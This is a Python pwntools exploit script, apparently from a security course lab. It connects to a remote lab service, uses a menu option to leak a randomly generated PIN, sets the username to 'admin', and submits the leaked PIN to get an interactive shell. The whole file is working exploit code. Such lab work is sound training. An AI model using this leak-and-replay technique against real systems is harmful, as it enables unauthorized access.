from pwn import *

# Launch exploit process
#p = gdb.debug("./lab6-1.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab6-1.bin")              # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7061)   # run the exploit against a remote process
print("\n")


# Read prompt
getChoice = p.recvuntil("Done: ")
print(getChoice)
print("\n")

# Send option to leak random generated value
p.sendline(b'2')

# Read prompt and print the random generated value
getUsername = p.recvuntil("username is: ")
getPIN = p.recv(2)
print("The leaked random value in bytes is: ", getPIN)
print("The leaked ramdom value in integer is: ", u16(getPIN))
intPIN = u16(getPIN)
print("\n")
getFinal = p.recvuntil("\n")
print("\n")

# Read prompt
getChoice = p.recvuntil("Done: ")
print(getChoice)
print("\n")

# Send option to set the username
p.sendline(b'1')

# Read prompt
getUsername = p.recvuntil("Username: ")
print(getUsername)
print("\n")

# Set the username
p.sendline(b'admin')

# Read prompt
getChoice = p.recvuntil("Done: ")
print(getChoice)
print("\n")

# Send option to retrun
p.sendline(b'3')

# Read prompt
getCode = p.recvuntil("code: ")
print(getCode)
print("\n")

# Send the PIN number
print("\n")
strPIN = str(intPIN)
bytePIN = strPIN.encode()
payload = bytePIN
print(payload)
p.sendline(payload)

# Switch to interactive after gaining shell
p.interactive()
